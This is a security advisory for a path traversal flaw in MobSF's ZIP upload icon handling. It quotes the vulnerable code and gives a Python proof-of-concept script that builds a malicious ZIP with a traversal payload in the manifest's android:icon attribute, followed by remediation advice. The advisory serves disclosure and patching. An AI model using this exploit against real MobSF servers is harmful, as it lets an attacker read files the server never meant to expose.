# [M] MobSF Vulnerable to Arbitrary File Read via Path Traversal in ZIP Uploads

## Summary
Severity: Medium
Advisory: GHSA-8j49-mmcx-4mp5
CVE: CVE-2026-68922
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-8j49-mmcx-4mp5
Type: github-advisory

## Affected
- PyPI: `mobsf` — affected >=0 <4.5.1

## Details
### Summary
The `find_icon_path_zip()` function in MobSF does not properly sanitize the `android:icon` attribute extracted from an Android manifest before resolving it as a filesystem path.

An attacker can supply a malicious `android:icon` value containing path traversal sequences, causing MobSF to read arbitrary files from the server filesystem and copy them into the downloads directory (`DWD_DIR`). These files can then be retrieved by any authenticated user via the `/download/<filename>` endpoint, provided the file extension is included in `ALLOWED_EXTENSIONS`.

### Details
```
elif icon_path.startswith(('res/', '/res/')):
    stripped_relative_path = icon_path.strip('/res')  # Works for neither /res nor res
    full_path = os.path.join(res_dir, stripped_relative_path)
    if os.path.exists(full_path):
        return full_path
    full_path += '.png'
    if os.path.exists(full_path):
        return full_path
```
https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/6e875fb77baa9dbe65ff8e7d0344d740e1d6d51e/mobsf/StaticAnalyzer/views/android/icon_analysis.py#L126

This code enables path traversal if a value like 'res/../../../signatures/maltrail-malware-domains.txt' is used as the icon path. This path will resolve to outside the scan directory, and the file will eventually be copied into `DWD_DIR/<md5>-icon.<ext>`:
```
icon_file = find_icon_path_zip(
        app_dic['md5'],
        res_path,
        icon_from_mfst)
    if icon_file and Path(icon_file).exists():
        dwd = Path(settings.DWD_DIR)
        out = dwd / (app_dic['md5'] + '-icon' + Path(icon_file).suffix)
        copy2(icon_file, out)
        app_dic['icon_path'] = out.name
```
https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/6e875fb77baa9dbe65ff8e7d0344d740e1d6d51e/mobsf/StaticAnalyzer/views/android/icon_analysis.py#L101

Because the output filename is derived from the MD5 hash of the uploaded archive (which the attacker can compute locally for his own ZIP), the attacker can deterministically retrieve the file via:
`GET /download/<md5>-icon.<ext>`

### PoC
The following script generates a malicious ZIP archive that exploits this issue by referencing an arbitrary file on the server (maltrail-malware-domains.txt):
```
import hashlib
import io
import zipfile

DEFAULT_HOST = "http://localhost:8000"
DEFAULT_TARGET = "res/../../../signatures/maltrail-malware-domains.txt"

MANIFEST_TEMPLATE = """\
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.icontraversal">
    <application android:icon="{target}"
                 android:label="PoC App">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
"""

MAIN_ACTIVITY = """\
package com.poc.icontraversal;
import android.app.Activity;
public class MainActivity extends Activity {}
"""

host = DEFAULT_HOST
target = DEFAULT_TARGET
host = host.rstrip("/")

# crate ZIP
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("AndroidManifest.xml", MANIFEST_TEMPLATE.format(target=target))
    zf.writestr("src/com/poc/icontraversal/MainActivity.java", MAIN_ACTIVITY)
    zf.writestr("res/drawable/placeholder.png", b"\x89PNG\r\n\x1a\n")

# compute hash
zip_bytes = buf.getvalue()
md5 = hashlib.md5(zip_bytes).hexdigest()

# write to disk
out_file = "poc_icon_traversal.zip"
with open(out_file, "wb") as f:
    f.write(zip_bytes)

import os
target_suffix = os.path.splitext(target.strip("/res").split("/")[-1])[1]
download_filename = f"{md5}-icon{target_suffix}"

print(f"[+] ZIP created : {os.path.abspath(out_file)}")
print(f"[+] Target file : {target}")
print()
print("[ Step 1 ] Upload the ZIP manually via the MobSF web UI")
print()
print("[ Step 2 ] Wait for the scan to complete, then browse to:")
print(f"    {host}/download/{download_filename}")
```


### Impact
This vulnerability allows an attacker with scan permissions to read files from the server filesystem outside the intended scan directory, as long as the target file has an extension in `ALLOWED_EXTENSIONS`. This can expose internal server files that are otherwise inaccessible through any legitimate endpoint. Additionally, this behavior enables a file existence oracle for any file path regardless of extension - the attacker can infer whether a file exists by checking the `icon_path` field in the scan report (if the target does not exist the path will be empty).

Depending on the deployment, this may expose sensitive configuration files, internal data, or security artifacts.

### Remediation
This can fixed by using the `is_path_traversal` [function](https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/6e875fb77baa9dbe65ff8e7d0344d740e1d6d51e/mobsf/MobSF/utils.py#L716) to validate user input.

## References
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-8j49-mmcx-4mp5
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/2627
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.5.1
